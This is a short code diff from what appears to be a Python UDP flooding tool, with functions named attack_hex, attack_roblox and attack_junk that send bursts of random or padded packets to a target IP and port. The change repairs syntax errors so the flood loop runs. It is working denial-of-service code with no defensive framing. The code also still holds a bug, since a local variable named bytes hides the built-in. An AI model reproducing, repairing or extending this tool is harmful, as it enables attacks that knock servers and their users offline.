@@ -57,16 +57,17 @@ def attack_hex(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
 
-def attack_roblox(ip, port, secs, size=65400):
+def attack_roblox(ip, port, secs, size):
     while time.time() < secs:
+
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random.urandom(size)
+        bytes = random._urandom(size)
         dport = random.randint(1, 65535) if port == 0 else port
-        for  in range(1500):
+        for _ in range(1500):
             ran = random.randrange(10 ** 80)
             hex = "%064x" % ran
             hex = hex[:64]
-            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport)
+            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))
 
 def attack_junk(ip, port, secs):
     payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
